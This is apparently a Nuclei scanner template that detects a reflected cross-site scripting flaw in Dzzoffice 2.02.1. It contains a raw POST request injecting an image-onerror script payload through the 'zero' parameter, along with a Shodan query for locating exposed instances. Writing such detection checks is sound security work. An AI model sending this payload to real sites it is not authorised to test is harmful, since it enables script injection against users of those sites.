http:
- matchers:
  - type: word
    words:
    - '"text":"<img src=x onerror=alert(document.domain)>'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /index.php?mod=system&op=orgtree&do=orgtree HTTP/1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    id=%23&nouser=0&moderator=0&zero=<img+src=x+onerror=alert(document.domain)>&stype=0&range=0&showjob=0

    '
id: dzzoffice-xss
info:
  author: arafatansari
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: 'Dzzoffice 2.02.1_SC_UTF8 contains a cross-site scripting vulnerability
    which allows remote attackers to inject arbitrary web script or HTML via the zero
    parameter.

    '
  metadata:
    max-request: 1
    shodan-query: http.html:"dzzoffice"
    verified: true
  name: Dzzoffice 2.02.1 - Cross-Site Scripting
  reference:
  - https://github.com/zyx0814/dzzoffice/issues/183
  severity: high
  tags: dzzoffice,xss
